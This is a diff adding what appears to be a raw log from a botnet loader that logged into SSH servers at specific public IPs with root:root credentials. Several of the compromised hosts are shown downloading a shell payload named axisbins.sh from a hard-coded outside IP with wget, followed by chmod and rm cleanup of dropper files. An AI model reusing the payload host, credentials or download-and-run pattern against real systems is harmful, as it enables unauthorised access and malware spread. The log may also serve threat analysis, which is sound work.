@@ -1,0 +1,37 @@
+root:root 3.221.155.63 port: 22 --> cat: /etc/issue: No such file or directory
+cat: : No such file or directory
+  
+root:root 35.203.27.69 port: 22 --> cat: /etc/issue: No such file or directory
+--2020-01-30 14:42:15--  http://89.42.133.67/axisbins.sh
+Connecting to 89.42.133.67:80... connected.
+HTTP request sent, awaiting response...   
+root:root 13.230.27.6 port: 22 --> Debian GNU/Linux 7 \n \l
+
+--2020-01-30 14:42:21--  http://89.42.133.67/axisbins.sh
+Connecting to 89.42.133.67:80... connected.
+HTTP request sent, awaiting response...   
+root:root 13.230.27.6 port: 22 --> 200 OK
+Length: 1504 (1K) [application/x-sh]
+Saving to: `/axisbins.sh'
+
+78% [==============================>        ] 1,185        2K/s  eta 0s100%[======================================>] 1,504        2K/s
+
+2020-01-30 14:42:21 (2 KB/s) - `/axisbins.sh' saved [1504/1504]
+
+  
+root:root 35.203.27.69 port: 22 --> 200 OK
+Length: 1504 (1K) [application/x-sh]
+Saving to: `/axisbins.sh'
+
+100% [=======================================>] 1,504        4K/s  eta 0s100%[======================================>] 1,504        4K/s
+
+2020-01-30 14:42:15 (4 KB/s) - `/axisbins.sh' saved [1504/1504]
+
+chmod: cannot access axistftp1.sh: No such file or directory
+chmod: cannot access axistftp2.sh: No such file or directory
+rm: cannot remove `-rf': No such file or directory
+rm: cannot remove `axistftp1.sh': No such file or directory
+rm: cannot remove `axistftp2.sh': No such file or directory
+rm: cannot remove `-rf': No such file or directory
+rm: cannot remove `*': No such file or directory
+  
